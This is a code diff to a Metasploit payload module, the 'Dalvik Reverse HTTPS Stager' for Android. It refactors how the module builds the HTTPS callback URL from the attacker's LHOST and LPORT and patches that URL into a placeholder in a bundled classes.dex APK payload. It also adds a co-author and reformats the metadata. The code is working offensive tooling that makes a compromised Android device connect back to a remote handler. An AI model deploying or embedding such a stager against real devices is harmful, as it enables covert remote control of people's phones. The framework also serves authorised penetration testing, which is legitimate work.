@@ -17,14 +17,14 @@ module Metasploit3
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Dalvik Reverse HTTPS Stager',
-      'Description'   => 'Tunnel communication over HTTPS',
-      'Author'        => 'anwarelmakrahy',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'android',
-      'Arch'          => ARCH_DALVIK,
-      'Handler'       => Msf::Handler::ReverseHttps,
-      'Stager'        => {'Payload' => ""}
+      'Name'        => 'Dalvik Reverse HTTPS Stager',
+      'Description' => 'Tunnel communication over HTTPS',
+      'Author'      => ['anwarelmakrahy', 'OJ Reeves'],
+      'License'     => MSF_LICENSE,
+      'Platform'    => 'android',
+      'Arch'        => ARCH_DALVIK,
+      'Handler'     => Msf::Handler::ReverseHttps,
+      'Stager'      => {'Payload' => ''}
     ))
   end
 
@@ -36,13 +36,12 @@ module Metasploit3
       uri_req_len = 5
     end
 
-    lurl = "ZZZZhttps://#{datastore["LHOST"]}"
-    lurl << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-    lurl << "/"
-    lurl << generate_uri_uuid_mode(:init_java, uri_req_len)
+    url = "https://#{datastore["LHOST"]}:#{datastore["LPORT"]}/"
+    # TODO: perhaps wire in an existing UUID from opts?
+    url << generate_uri_uuid_mode(:init_java, uri_req_len)
 
     classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
-    string_sub(classes, 'ZZZZ' + ' ' * 512, lurl)
+    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + url)
 
     verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                          datastore['HandlerSSLCert'])
